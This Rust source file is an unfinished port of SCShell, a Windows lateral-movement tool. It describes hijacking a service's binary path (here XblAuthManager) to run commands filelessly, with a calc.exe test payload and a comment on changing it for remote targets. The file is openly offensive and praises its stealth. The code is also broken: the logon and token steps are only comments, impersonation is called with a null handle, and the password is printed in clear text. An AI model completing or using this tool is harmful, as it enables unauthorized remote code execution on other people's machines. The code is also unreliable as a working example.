// SCSHell, Rust Variant
// Refs: 
//  - https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/scshell_c_embed_bin.nim, 
//  - https://github.com/Mr-Un1k0d3r/SCShell
// Fileless command execution/lateral movement on Windows hosts via rewriting the service execution path to execute cmd.exe, then changes it back
// OPSEC wise, it might not get better than this in some ways

use std::{ffi::{CString, CStr}};
use std::ptr;
use std::io;
use std::io::prelude::*;
use std::io::{stdin, stdout, Read, Write};
use winapi::um::securitybaseapi;
use std::ptr::null_mut;
use winapi::um::handleapi::CloseHandle;
use winapi::um::processthreadsapi::GetCurrentProcess;
use winapi::um::processthreadsapi::OpenProcessToken;
use winapi::um::winnt::TokenElevation;
use winapi::um::winnt::HANDLE;
use winapi::um::winnt::TOKEN_ELEVATION;
use std::mem;
use winapi::ctypes::c_void;
use winapi::um::winnt::TOKEN_QUERY;
use winapi::um::securitybaseapi::ImpersonateLoggedOnUser;
use winapi::shared::ntdef::NULL;


fn breakpoint() {
    let mut stdout = stdout();
    stdout.write(b"[*] Press Enter to continue...\n").unwrap();
    stdout.flush().unwrap();
    stdin().read(&mut [0]).unwrap();
}


// proc SCShell(targetHost: cstring, serviceName: cstring, payload: cstring, domain: cstring, username: cstring, password: cstring): int

fn SCShell(mut target_host: &str, service_name: &str, payload: &str, domain: &str, user: &str, password: &str) -> i32 {
    println!("[*] Host: {}", &target_host);
    println!("[*] Service Name: {}", &service_name);
    println!("[*] Payload: {}", &payload);
    println!("[*] Domain: {}", &domain);
    println!("[*] Username: {}", &user);
    println!("[*] Password: {}", &password);

    /*
    let mut cstr_target_host: CString = CString::new(target_host).unwrap();
    let cstr_service_name: CString = CString::new(service_name).unwrap();
    let cstr_payload: CString = CString::new(payload).unwrap();
    let cstr_domain: CString = CString::new(domain).unwrap();
    let cstr_user: CString = CString::new(user).unwrap();
    let cstr_password: CString = CString::new(password).unwrap();
 */
    unsafe{
    if target_host == "local" {
        let target_host = null_mut();
        println!("[*] Target is localhost...")
    }

    else {
        println!("[*] Trying to connect to {}", target_host.to_string())
    }

    // If a username is passed, use that. If not, acquire the token from the process and pass the hash

    let mut hToken: HANDLE = null_mut();

    if user != "" {
        println!("[+] Username provided, using that...")
        // Use LogonUserA API call to return bResult
    } else {
        println!("[*] No username provided, using current process context to acquire token...")
        // Use OpenProcessToken to acquire the current proces token and write it out to hToken
    }

   
    let mut bResult = false;
    let bResult = ImpersonateLoggedOnUser(hToken);
    if bResult == 0 {
        //
        println!("[-] Impersonate user failed")
    }



    return 0
}
}


fn main() {
    println!("[!] SCShell!");

    let res = SCShell(
    "local", 
    "XblAuthManager",
    r"C:\WINDOWS\system32\cmd.exe /C calc.exe",
    "", // want to do it remotely? Change me!
    "",
    ""
    );

    println!("[*] Result: {}", res.to_string())

}
